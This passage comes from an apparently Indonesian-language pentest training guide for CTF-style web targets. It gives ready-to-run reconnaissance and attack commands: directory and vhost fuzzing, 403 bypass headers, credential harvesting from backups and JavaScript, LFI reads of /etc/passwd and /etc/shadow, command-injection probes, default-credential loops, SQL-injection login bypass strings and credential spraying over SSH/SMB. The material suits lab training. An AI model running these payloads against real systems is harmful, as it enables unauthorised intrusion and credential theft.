grep -iE "password|user|host|secret" ~/web_recon/loot/db.sql | head -30
unzip -l ~/web_recon/loot/backup.zip | head -30
```

**OUTPUT BERHASIL ✅ — Credentials dari config.php.bak:**

PHP

```
<?php
$db_host = 'localhost';
$db_user = 'admin';
$db_pass = 'P@ssw0rd_2024!';
$db_name = 'corporate_db';
define('SECRET_KEY', 'myS3cr3tK3y!');
?>
```

➡️ **SIMPAN CREDENTIALS:**

Bash

```
echo "DB: admin:P@ssw0rd_2024!" >> ~/web_recon/loot/found_creds.txt
echo "Secret Key: myS3cr3tK3y!" >> ~/web_recon/loot/found_creds.txt

# Test credentials ke semua service yang ditemukan di nmap!
nxc ssh $TARGET -u admin -p 'P@ssw0rd_2024!'
nxc smb $TARGET -u admin -p 'P@ssw0rd_2024!'
```

**OUTPUT GAGAL ❌ — ffuf terlalu banyak false positive (429 atau 503):**

text

```
[Status: 429, ...] (banyak baris)
```

➡️ WAF atau rate limiting:

Bash

```
# Kurangi speed dan ganti User-Agent
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/dirb/wordlists/common.txt \
    -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -rate 10 -t 5 -p 0.5 -c \
    -mc 200,301,302,403 \
    ${FILTER_SIZE:+-fs $FILTER_SIZE}
```

---

### Langkah 4.5 — 403 Bypass (Jika Ada Direktori 403)

Bash

```
# Jika ada direktori yang 403 Forbidden, coba bypass:

FORBIDDEN_PATH="/backup"   # Ganti dengan path yang 403

# Method 1: Trailing slash variations
curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL$FORBIDDEN_PATH/"
curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL$FORBIDDEN_PATH/."

# Method 2: HTTP Method override
curl -s -o /dev/null -w "%{http_code}" -k -X POST "$TARGET_URL$FORBIDDEN_PATH"
curl -s -o /dev/null -w "%{http_code}" -k -X OPTIONS "$TARGET_URL$FORBIDDEN_PATH"

# Method 3: Header injection untuk bypass IP-based restriction
curl -s -k "$TARGET_URL$FORBIDDEN_PATH" -H "X-Forwarded-For: 127.0.0.1"
curl -s -k "$TARGET_URL$FORBIDDEN_PATH" -H "X-Real-IP: 127.0.0.1"
curl -s -k "$TARGET_URL$FORBIDDEN_PATH" -H "X-Custom-IP-Authorization: 127.0.0.1"

# Method 4: Path variations
curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL/%2f$FORBIDDEN_PATH"
curl -s -o /dev/null -w "%{http_code}" -k "$TARGET_URL/$FORBIDDEN_PATH%20"

# Method 5: Tool otomatis
# pip install byp4xx
# byp4xx $TARGET_URL$FORBIDDEN_PATH
```

**OUTPUT BERHASIL ✅ — Bypass berhasil:**

text

```
200  ← Dari method X-Forwarded-For: 127.0.0.1
```

➡️ Browse direktori dengan header tersebut:

Bash

```
curl -s -k "$TARGET_URL$FORBIDDEN_PATH/" \
    -H "X-Forwarded-For: 127.0.0.1" | head -30
```

---

## ══════════════════════════════════════

## FASE 5: VIRTUAL HOST ENUMERATION

## ══════════════════════════════════════

### Langkah 5.1 — Baseline Size untuk VHost Fuzzing

Bash

```
# STEP 1: Ambil ukuran halaman default (dengan Host yang tidak ada)
VHOST_BASELINE=$(curl -s -k "$TARGET_URL" \
    -H "Host: nonexistentxyz12345.$DOMAIN" | wc -c)
echo "[*] VHost baseline size: $VHOST_BASELINE bytes"

# Bandingkan dengan halaman normal
NORMAL_SIZE=$(curl -s -k "$TARGET_URL" | wc -c)
echo "[*] Normal page size: $NORMAL_SIZE bytes"
```

**OUTPUT BERHASIL ✅ — Baseline berbeda dari normal:**

text

```
VHost baseline size: 3120 bytes
Normal page size: 4521 bytes
```

➡️ Ada perbedaan. Set filter:

Bash

```
export VHOST_FILTER=$VHOST_BASELINE
echo "[*] Akan filter VHost responses berukuran $VHOST_FILTER bytes"
```

---

### Langkah 5.2 — Virtual Host Fuzzing

Bash

```
# Command 1: ffuf VHost fuzzing (UTAMA)
ffuf -u "$TARGET_URL" \
    -H "Host: FUZZ.$DOMAIN" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -fs $VHOST_FILTER \
    -c -t 50 \
    | tee ~/web_recon/vhost/vhost_scan.txt

# Command 2: Gobuster VHost mode (alternatif)
gobuster vhost -u "http://$TARGET" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    --append-domain \
    -t 40 \
    | tee ~/web_recon/vhost/gobuster_vhost.txt

# Command 3: Wordlist lebih lengkap jika 5000 tidak cukup
ffuf -u "$TARGET_URL" \
    -H "Host: FUZZ.$DOMAIN" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
    -fs $VHOST_FILTER \
    -c -t 50
```

**OUTPUT BERHASIL ✅ — VHost ditemukan:**

text

```
admin          [Status: 200, Size: 4120, Words: 320, Lines: 85]
dev            [Status: 200, Size: 1845, Words: 95, Lines: 42]
staging        [Status: 302, Size: 240, Words: 15, Lines: 8]
api            [Status: 200, Size: 892, Words: 45, Lines: 20]
```

➡️ **Tambahkan semua ke /etc/hosts dan recon ulang:**

Bash

```
# Tambahkan ke /etc/hosts
echo "$TARGET admin.$DOMAIN dev.$DOMAIN staging.$DOMAIN api.$DOMAIN" | sudo tee -a /etc/hosts

# Verifikasi
ping -c 1 admin.$DOMAIN

# Quick check setiap VHost baru
for sub in admin dev staging api; do
    echo "=== $sub.$DOMAIN ==="
    curl -s -k "http://$sub.$DOMAIN" | head -10
    whatweb -a 3 "http://$sub.$DOMAIN" 2>/dev/null | head -3
    echo ""
done

# → Untuk setiap VHost yang ditemukan, ULANGI Fase 1-4 dari awal!
```

**OUTPUT BERHASIL ✅ — VHost admin dengan login panel:**

text

```
admin.target.htb → WordPress admin login
```

➡️ Langsung ke WordPress exploitation workflow:

Bash

```
# → ke <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>
wpscan --url "http://admin.$DOMAIN" --enumerate u,p,t
```

**OUTPUT GAGAL ❌ — Tidak ada VHost ditemukan:**

text

```
(ffuf selesai tanpa output dengan -fs applied)
```

➡️ Coba variasi:

Bash

```
# Coba tanpa filter dulu untuk melihat ukuran yang konsisten
ffuf -u "$TARGET_URL" \
    -H "Host: FUZZ.$DOMAIN" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -c -t 20 | head -30

# Coba dengan wordlist berbeda
ffuf -u "$TARGET_URL" \
    -H "Host: FUZZ.$DOMAIN" \
    -w /usr/share/seclists/Discovery/DNS/namelist.txt \
    -fs $VHOST_FILTER -c -t 50
```

---

## ══════════════════════════════════════

## FASE 6: SOURCE CODE ANALYSIS

## ══════════════════════════════════════

### Langkah 6.1 — HTML Source Analysis

Bash

```
# Command 1: Download source halaman utama
curl -s -k $TARGET_URL -o ~/web_recon/index.html

# Command 2: Cari HTML comments yang sensitif
grep -oP '<!--[\s\S]*?-->' ~/web_recon/index.html | head -20

# Command 3: Cari hidden input fields
grep -i "type=['\"]hidden" ~/web_recon/index.html

# Command 4: Cari hardcoded credentials atau API keys
grep -iE "api[_-]?key|password|secret|token|bearer|apikey" ~/web_recon/index.html

# Command 5: Ekstrak semua link dan path internal
grep -oP 'href=["\'][^"\']*["\']|src=["\'][^"\']*["\']' ~/web_recon/index.html | sort -u

# Command 6: Cari JavaScript files yang di-include
grep -oP 'src=["\']([^"\']+\.js)["\']' ~/web_recon/index.html | awk -F'"' '{print $2}' | sort -u
```

**OUTPUT BERHASIL ✅ — Credential di HTML comment:**

text

```
<!-- Admin password: AdminP@ss2024! - Remove before production! -->
<!-- TODO: Remove debug endpoint /api/v2/debug?token=abc123 -->
<!-- DB_PASSWORD=temppass123 -->
```

➡️ **Jackpot!**

Bash

```
echo "From HTML comment - Admin: AdminP@ss2024!" >> ~/web_recon/loot/found_creds.txt

# Test debug endpoint yang ditemukan
curl -s -k "$TARGET_URL/api/v2/debug?token=abc123" | python3 -m json.tool
```

**OUTPUT BERHASIL ✅ — Hidden field yang bisa dimanipulasi:**

HTML

```
<input type="hidden" name="is_admin" value="false">
<input type="hidden" name="role" value="user">
<input type="hidden" name="user_id" value="42">
```

➡️ **Manipulasi via Burp Suite!** Intercept request dan ubah value:

text

```
is_admin=true
role=admin
user_id=1
```

---

### Langkah 6.2 — JavaScript File Analysis

Bash

```
# Command 1: Download semua JS files yang ditemukan
JS_DIR=~/web_recon/js
mkdir -p $JS_DIR

# Ambil list JS files dari halaman
curl -s -k $TARGET_URL | grep -oP 'src=["\']([^"\']+\.js)["\']' | awk -F'"' '{print $2}' > /tmp/js_files.txt

# Download setiap JS file
while read js; do
    # Handle relative path
    if [[ "$js" == /* ]]; then
        curl -s -k "$TARGET_URL$js" -o "$JS_DIR/$(basename $js)"
    elif [[ "$js" == http* ]]; then
        curl -s -k "$js" -o "$JS_DIR/$(basename $js)"
    else
        curl -s -k "$TARGET_URL/$js" -o "$JS_DIR/$(basename $js)"
    fi
done < /tmp/js_files.txt

# Command 2: Grep sensitif dari semua JS files
grep -rnEi "api[_-]?key|password|secret|token|auth|bearer|credential|apiurl|endpoint" $JS_DIR/ | head -30

# Command 3: Cari endpoint API tersembunyi
grep -rnEo "/(api|v1|v2|v3|admin|user|auth|login|register|internal|debug)/[a-zA-Z0-9./?=_-]*" $JS_DIR/ | sort -u

# Command 4: LinkFinder (tool khusus JS endpoint extraction)
# pip3 install linkfinder || git clone https://github.com/GerbenJavado/LinkFinder
# python3 linkfinder.py -i "$TARGET_URL/static/js/main.js" -o cli
```

**OUTPUT BERHASIL ✅ — API key di JavaScript:**

JavaScript

```
// js/config.js
const API_KEY = "sk-prod-1234abcd5678efgh";
const ADMIN_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...";
const API_URL = "http://api.internal.target.htb/v2/";
```

➡️:

Bash

```
echo "API Key dari JS: sk-prod-1234abcd5678efgh" >> ~/web_recon/loot/found_creds.txt
echo "Internal API: http://api.internal.target.htb/v2/" >> ~/web_recon/loot/interesting_findings.txt

# Tambahkan domain internal ke /etc/hosts dan explore
echo "$TARGET api.internal.target.htb" | sudo tee -a /etc/hosts
curl -s "http://api.internal.target.htb/v2/" -H "Authorization: Bearer eyJhbGci..."
```

**OUTPUT BERHASIL ✅ — Source map file tersedia:**

Bash

```
# Cek apakah .map file ada
curl -s -I -k "$TARGET_URL/static/js/main.chunk.js.map"
# Jika 200 OK:

# Rekonstruksi source code
curl -s -k "$TARGET_URL/static/js/main.chunk.js.map" | python3 -c "
import json, sys, os
data = json.load(sys.stdin)
os.makedirs('restored_src', exist_ok=True)
for i, src in enumerate(data.get('sources', [])):
    content = data.get('sourcesContent', [])[i] if i < len(data.get('sourcesContent', [])) else ''
    if content:
        out = os.path.join('restored_src', src.replace('../', '').lstrip('/'))
        os.makedirs(os.path.dirname(out), exist_ok=True)
        with open(out, 'w') as f:
            f.write(content)
        print(f'[+] {src}')
"
# Setelah rekonstruksi, grep credentials dari source code asli:
grep -rnEi "password|secret|key|api" restored_src/ | head -30
```

---

## ══════════════════════════════════════

## FASE 7: PARAMETER DISCOVERY

## ══════════════════════════════════════

### Langkah 7.1 — Temukan Parameter Tersembunyi

Bash

```
# Identifikasi halaman yang tampak dinamis
DYNAMIC_PAGES=(
    "/index.php"
    "/view.php"
    "/page.php"
    "/item.php"
    "/search.php"
    "/utility.php"
)

# Command 1: Arjun (tool terbaik untuk parameter discovery)
pip3 install arjun 2>/dev/null || pipx install arjun

# GET parameter
arjun -u "$TARGET_URL/index.php" -m GET | tee ~/web_recon/params/arjun_get.txt

# POST parameter
arjun -u "$TARGET_URL/login.php" -m POST | tee ~/web_recon/params/arjun_post.txt

# JSON API parameter
arjun -u "$TARGET_URL/api/v1/user" -m JSON | tee ~/web_recon/params/arjun_json.txt

# Command 2: ffuf untuk parameter fuzzing (jika Arjun tidak tersedia)
# GET parameter
PARAM_SIZE=$(curl -s -k "$TARGET_URL/index.php" | wc -c)
ffuf -u "$TARGET_URL/index.php?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs $PARAM_SIZE -c -t 40 \
    | tee ~/web_recon/params/ffuf_params_get.txt

# POST parameter
ffuf -u "$TARGET_URL/admin.php" \
    -X POST -d "FUZZ=1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs $PARAM_SIZE -c -t 40 \
    | tee ~/web_recon/params/ffuf_params_post.txt
```

**OUTPUT BERHASIL ✅ — Parameter tersembunyi ditemukan:**

text

```
[*] Probing endpoint: http://10.10.11.140/utility.php
[+] Valid parameter found: file
[+] Valid parameter found: debug
[+] Valid parameter found: test_mode
[+] Scanning completed. 3 parameter(s) discovered.
```

➡️ **Test setiap parameter untuk vulnerability:**

Bash

```
# Parameter 'file' → Test LFI!
curl -s -k "$TARGET_URL/utility.php?file=/etc/passwd"
curl -s -k "$TARGET_URL/utility.php?file=../../../../etc/passwd"
curl -s -k "$TARGET_URL/utility.php?file=....//....//....//etc/passwd"
# → ke <a href="/docs/lfi-rfi" class="text-[#00b4d8] hover:underline font-mono font-semibold">24_lfi_rfi_workflow.md</a> jika LFI confirmed

# Parameter 'debug' → Test Command Injection!
curl -s -k "$TARGET_URL/utility.php?debug=id"
curl -s -k "$TARGET_URL/utility.php?debug=whoami"
# → ke <a href="/docs/command-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">26_command_injection_workflow.md</a> jika confirmed

# Parameter 'id' → Test SQL Injection!
curl -s -k "$TARGET_URL/view.php?id=1'"
curl -s -k "$TARGET_URL/view.php?id=1 OR 1=1--"
# → ke <a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a> jika confirmed
```

**OUTPUT BERHASIL ✅ — LFI confirmed:**

text

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

➡️ **LFI found!** Lanjut ke [Workflow 24 — LFI / RFI](/docs/lfi-rfi):

Bash

```
# Quick credential harvest dari LFI
for file in /etc/passwd /etc/shadow /etc/hosts /proc/version; do
    echo "=== $file ==="
    curl -s -k "$TARGET_URL/utility.php?file=$file" | head -5
done

# Cari file credential yang umum
curl -s -k "$TARGET_URL/utility.php?file=/var/www/html/.env"
curl -s -k "$TARGET_URL/utility.php?file=/var/www/html/config.php"
```

---

## ══════════════════════════════════════

## FASE 8: CMS DETECTION & EXPLOITATION

## ══════════════════════════════════════

### Langkah 8.1 — CMS Detection Decision

Bash

```
# Berdasarkan temuan WhatWeb, tentukan CMS:
# Cek tanda-tanda CMS

# WordPress
curl -s -k "$TARGET_URL/wp-login.php" | grep -i "WordPress" && echo "[+] WordPress DETECTED"
curl -s -k "$TARGET_URL/wp-json/wp/v2/users" | python3 -m json.tool | head -20

# Joomla
curl -s -k "$TARGET_URL/administrator/" | grep -i "joomla" && echo "[+] Joomla DETECTED"
curl -s -k "$TARGET_URL/README.txt" | head -5

# Drupal
curl -s -k "$TARGET_URL/CHANGELOG.txt" | head -5
curl -s -k "$TARGET_URL/sites/default/default.settings.php" && echo "[+] Drupal DETECTED"

# Laravel (PHP Framework)
curl -s -k "$TARGET_URL/" | grep -i "laravel" && echo "[+] Laravel DETECTED"
# Check .env via LFI atau direct access
```

**OUTPUT BERHASIL ✅ — WordPress:**

text

```
[+] WordPress DETECTED
```

➡️:

Bash

```
# WPScan untuk full WordPress recon
wpscan --url $TARGET_URL \
    --enumerate u,p,t,cb,dbe \
    --plugins-detection aggressive \
    -o ~/web_recon/wpscan_report.txt

# → ke <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>
```

**OUTPUT BERHASIL ✅ — Joomla:**

text

```
[+] Joomla DETECTED
```

➡️:

Bash

```
# droopescan untuk Joomla
droopescan scan joomla -u $TARGET_URL -t 32

# → ke <a href="/docs/joomla" class="text-[#00b4d8] hover:underline font-mono font-semibold">17b_joomla_workflow.md</a>
```

---

## ══════════════════════════════════════

## FASE 9: LOGIN PAGE EXPLOITATION

## ══════════════════════════════════════

### Langkah 9.1 — Jika Menemukan Login Form

Bash

```
# Identifikasi login page
LOGIN_URL="$TARGET_URL/login.php"   # Ganti sesuai temuan

# STEP 1: Cek form structure
curl -s -k $LOGIN_URL | grep -iE "input|form|action|method" | head -20

# STEP 2: Test default credentials
for cred in "admin:admin" "admin:password" "admin:123456" "root:root" "administrator:admin" "admin:"; do
    user=$(echo $cred | cut -d: -f1)
    pass=$(echo $cred | cut -d: -f2)
    response=$(curl -s -k -c /tmp/cookies.txt -X POST "$LOGIN_URL" \
        -d "username=$user&password=$pass" \
        -w "%{http_code}" -o /tmp/login_resp.html)
    if echo "$(cat /tmp/login_resp.html)" | grep -qi "dashboard\|welcome\|logout\|admin panel"; then
        echo "[+] LOGIN SUCCESS: $user:$pass"
        break
    fi
    echo "[-] Failed: $user:$pass (HTTP $response)"
done

# STEP 3: SQLi bypass
curl -s -k -X POST "$LOGIN_URL" \
    -d "username=admin'--&password=anything" \
    | grep -i "dashboard\|welcome\|admin"

curl -s -k -X POST "$LOGIN_URL" \
    -d "username=admin' OR '1'='1'--&password=x" \
    | grep -i "dashboard\|welcome\|admin"
```

**OUTPUT BERHASIL ✅ — SQLi bypass berhasil:**

HTML

```
<title>Admin Dashboard - Welcome admin!</title>
```

➡️ **Auth bypass berhasil!** Lanjut ke:

Bash

```
# → ke <a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>
# → ke <a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a> untuk full SQLi exploitation
```

---

## ══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`ffuf` semua 200 OK|Soft 404 / Wildcard response|Cari baseline size, tambah `-fs [SIZE]`|
|`x509: certificate signed by unknown authority`|Self-signed SSL|Tambah flag `-k` di ffuf dan curl|
|HTTP 429 Too Many Requests|Rate limiting|`-rate 20 -t 5 -p 0.5` di ffuf|
|HTTP 403 untuk semua path|WAF aktif|Ganti User-Agent, kurangi rate|
|`curl: (47) Maximum redirects`|Infinite redirect loop|`curl -s -i` untuk lihat Location header, tambahkan ke /etc/hosts|
|Fuzzing 200k kata, tidak ada hasil|Wordlist mismatch|Cek teknologi, sesuaikan ekstensi|
|VHost fuzzing tidak ada hasil|Filter size salah|Recalculate baseline, coba tanpa filter dulu|
|`connection refused`|Port salah|Scan ulang semua port, coba 8080/8443/5000|
|`whatweb` tidak detect apapun|Aplikasi custom|Analisis manual header + source code|
|IP menampilkan Apache default page|Virtual hosting|Tambahkan domain ke /etc/hosts, coba dengan Host header|
|git-dumper error|`.git` partial atau protected|Coba `gittools`, `githack`, atau `git-dumper` dengan timeout berbeda|
|`arjun` tidak tersedia|Belum install|`pip3 install arjun` atau `pipx install arjun`|

---

## ══════════════════════════════════════

## MASTER DECISION TREE (RINGKASAN)

## ══════════════════════════════════════

text

```
START: Port 80/443/8080 Open
│
├─ FASE 0: Konfirmasi Port & URL
│   ├─ Redirect ke domain → Tambah /etc/hosts
│   └─ HTTPS self-signed → Pakai -k di semua command
│
├─ FASE 1: Technology Detection
│   ├─ [WordPress] → wpscan → <a href="/docs/wordpress" class="text-[#00b4d8] hover:underline font-mono font-semibold">17a_wordpress_workflow.md</a>
│   ├─ [Joomla]    → droopescan → <a href="/docs/joomla" class="text-[#00b4d8] hover:underline font-mono font-semibold">17b_joomla_workflow.md</a>
│   ├─ [Flask]     → Cek SSTI, decode cookie → <a href="/docs/ssti" class="text-[#00b4d8] hover:underline font-mono font-semibold">23_ssti_workflow.md</a>
│   ├─ [Spring Boot] → Actuators → heapdump → creds
│   └─ [Custom]    → Lanjut ke Fase berikutnya
│
├─ FASE 2: Passive OSINT
│   ├─ crt.sh → Subdomain list
│   └─ Wayback Machine → Hidden URLs
│
├─ FASE 3: Sensitive Files
│   ├─ [.git exposed]   → git-dumper → Source code analysis
│   ├─ [.env found]     → Credentials → Test ke semua service
│   ├─ [phpinfo.php]    → Info gathering → LFI paths
│   └─ [Actuator found] → heapdump → Password extraction
│
├─ FASE 4: Directory Fuzzing
│   ├─ [/admin found]   → Default creds / SQLi bypass
│   ├─ [/uploads found] → File upload → <a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>
│   ├─ [/api found]     → API enumeration → <a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>
│   ├─ [backup files]   → Download & grep credentials
│   └─ [403 paths]      → Bypass attempts
│
├─ FASE 5: VHost Enumeration
│   └─ [VHost found] → Ulangi Fase 1-4 untuk setiap VHost
│
├─ FASE 6: Source Code Analysis
│   ├─ [HTML comments] → Credentials / Hidden endpoints
│   ├─ [JS analysis]   → API keys / Internal URLs
│   └─ [Source map]    → Rekonstruksi source → Analisis logic
│
└─ FASE 7: Parameter Discovery
    ├─ [?file=]  → LFI → <a href="/docs/lfi-rfi" class="text-[#00b4d8] hover:underline font-mono font-semibold">24_lfi_rfi_workflow.md</a>
    ├─ [?id=]   → SQLi → <a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a>
    ├─ [?cmd=]  → RCE → <a href="/docs/command-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">26_command_injection_workflow.md</a>
    └─ [?page=] → LFI atau SSRF → <a href="/docs/ssrf" class="text-[#00b4d8] hover:underline font-mono font-semibold">22_ssrf_workflow.md</a>
```

---

## ⚡ CHEATSHEET — COPY PASTE READY

Bash

```
# === SETUP ===
export TARGET="10.10.11.200"
export TARGET_URL="http://$TARGET"
export DOMAIN="target.htb"
export LHOST="10.10.14.5"
mkdir -p ~/web_recon/{ffuf,vhost,js,git,params,loot}

# === TECHNOLOGY DETECTION ===
whatweb -a 3 $TARGET_URL                                    # CMS + stack
curl -s -I -L -k $TARGET_URL                               # Raw headers
nikto -h $TARGET_URL -output ~/web_recon/nikto.txt &       # Background scan

# === ROBOTS & SENSITIVE FILES ===
curl -s $TARGET_URL/robots.txt                             # robots.txt
curl -s $TARGET_URL/sitemap.xml                            # sitemap
curl -s -I $TARGET_URL/.git/HEAD                           # Git exposure
curl -s -I $TARGET_URL/.env                                # .env exposure
curl -s $TARGET_URL/phpinfo.php | grep -i "php_version"   # phpinfo

# === DIRECTORY FUZZING ===
# Baseline check
BASELINE=$(curl -s -k "$TARGET_URL/random_nonexistent_xyz" | wc -c)

# Quick (< 30s)
ffuf -u "$TARGET_URL/FUZZ" -w /usr/share/dirb/wordlists/common.txt -c -t 50

# Standard CTF
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -c -v -ic -t 40 -fs $BASELINE

# File fuzzing (PHP)
ffuf -u "$TARGET_URL/FUZZ" \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -e .php,.bak,.old,.txt,.zip,.sql -c -t 40 -fs $BASELINE

# HTTPS target
ffuf -u "https://$TARGET/FUZZ" \
    -w /usr/share/dirb/wordlists/common.txt \
    -c -k -t 40 -fs $BASELINE

# === VHOST FUZZING ===
VBASE=$(curl -s -k "$TARGET_URL" -H "Host: nonexistentxyz.$DOMAIN" | wc -c)
ffuf -u "$TARGET_URL" \
    -H "Host: FUZZ.$DOMAIN" \
    -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
    -fs $VBASE -c -t 50

# Tambah VHost ke /etc/hosts
echo "$TARGET sub1.$DOMAIN sub2.$DOMAIN" | sudo tee -a /etc/hosts

# === JS ANALYSIS ===
wget -r -l 2 -A "*.js" -P ~/web_recon/js/ $TARGET_URL/
grep -rnEi "api_key|password|secret|token|endpoint" ~/web_recon/js/

# === GIT DUMPING ===
git-dumper $TARGET_URL/.git/ ~/web_recon/git/
cd ~/web_recon/git/ && git log -p | grep -Ei "password|secret|key"

# === PARAMETER DISCOVERY ===
arjun -u "$TARGET_URL/page.php" -m GET
ffuf -u "$TARGET_URL/page.php?FUZZ=test" \
    -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
    -fs $BASELINE -c

# === 403 BYPASS ===
curl -k "$TARGET_URL/admin" -H "X-Forwarded-For: 127.0.0.1"
curl -k "$TARGET_URL/admin/" -H "X-Real-IP: 127.0.0.1"

# === PASSIVE OSINT ===
curl -s "https://crt.sh/?q=%25.$DOMAIN&output=json" | python3 -c "import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]" | sort -u
```

---

> **➡️ NEXT:** Setelah Web Recon selesai dan menemukan teknologi/path/credentials:
> 
> - CMS terdeteksi → **`17a/17b/<a href="/docs/drupal-cms" class="text-[#00b4d8] hover:underline font-mono font-semibold">17c_cms_workflow.md</a>`**
> - Login form ditemukan → **`<a href="/docs/authentication-bypass" class="text-[#00b4d8] hover:underline font-mono font-semibold">18_authentication_bypass_workflow.md</a>`**
> - Parameter `?file=` atau `?page=` → **`<a href="/docs/lfi-rfi" class="text-[#00b4d8] hover:underline font-mono font-semibold">24_lfi_rfi_workflow.md</a>`**
> - Parameter `?id=` dengan SQL error → **`<a href="/docs/sql-injection" class="text-[#00b4d8] hover:underline font-mono font-semibold">19_sql_injection_workflow.md</a>`**
> - Flask cookie atau error page → **`<a href="/docs/ssti" class="text-[#00b4d8] hover:underline font-mono font-semibold">23_ssti_workflow.md</a>`**
> - API endpoint ditemukan → **`<a href="/docs/api-security" class="text-[#00b4d8] hover:underline font-mono font-semibold">30_api_security_workflow.md</a>`**
> - File upload form → **`<a href="/docs/file-upload" class="text-[#00b4d8] hover:underline font-mono font-semibold">25_file_upload_workflow.md</a>`**

[](https://messages-prod.27c852f3500f38c1e7786e2c9ff9e48f.r2.cloudflarestorage.com/aad5bafd-ac04-4d8f-9667-3d87b6995a58/1789039411151-15_web_recon_workflow.pdf?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=b33de61d4f22a31b59b25364ab5037c5%2F20260910%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20260910T112333Z&X-Amz-Expires=3600&X-Amz-Signature=bf732d8812793c7dccc5e13b4db5441b72da7e03cd3486a207752ca5a605c167&X-Amz-SignedHeaders=host&x-amz-checksum-mode=ENABLED&x-id=GetObject)

## 📚 LANJUT KE FILE 16

```text
═══════════════════════════════════════════════════════════════════
  ✅  FILE 15 SELESAI — WEB RECONNAISSANCE & ENUMERATION WORKFLOW
═══════════════════════════════════════════════════════════════════
  Yang telah Anda kuasai:
  ✅ Perbedaan fundamental Network Recon vs Web Recon
  ✅ Mental Model & Urutan Eksekusi Web Recon yang disiplin
  ✅ Technology Detection (WhatWeb, webanalyze, curl headers, Nikto)
  ✅ Eksploitasi pasif robots.txt & sitemap.xml
  ✅ Fuzzing Master Workflow (ffuf, gobuster, feroxbuster, wordlists)
  ✅ Response Filtering Kritis (-fc, -fs, -fw, -fl)
  ✅ Source Code Analysis, JavaScript Grep, & .git Dumping
  ✅ Virtual Host Enumeration & /etc/hosts mapping
  ✅ Parameter Discovery (Arjun & ffuf)
  ✅ Information Disclosure 20+ path sensitif
  ✅ Web Recon Automation Script siap pakai di Parrot OS
  ✅ Mega Decision Tree & Troubleshooting 10 Common Errors

  🔜 MASTER ROADMAP SERI WEB EXPLOITATION:
     - File 16: CMS Detection & Exploitation Workflow (WordPress, Joomla, Drupal, Other CMS)
     - File 17: Authentication Bypass & Session Management Workflow
     - File 18: SQL Injection (SQLi) Workflow (Manual & Automated sqlmap)
     - File 19: Cross-Site Scripting (XSS) & Client-Side Attacks
     - File 20: File Inclusion (LFI/RFI) & File Upload Bypass
     - File 21: Command Injection & Remote Code Execution (RCE)
     - File 22: Server-Side Template Injection (SSTI) & Modern Web Exploits

  🎯 MUSCLE MEMORY TARGET:
     - Port 80/443 -> WhatWeb -> Cek robots.txt -> ffuf directory
     - Fuzzing Soft 404? -> Wajib pakai -fs [SIZE]
     - Target HTTPS / Self-Signed Cert? -> Wajib pakai -k di ffuf & curl
     - IP kasih default page? -> Fuzzing Virtual Host (-H "Host: FUZZ.domain" -fs [SIZE])
═══════════════════════════════════════════════════════════════════
```

→ [16. Directory & Virtual Host (VHost) Fuzzing Workflow — Master Field Guide](/docs/directory-vhost-fuzzing)

---

**© 2026 Cybersecurity Pentest Documentation** | Parrot OS Workflow Series | File 15 of 20+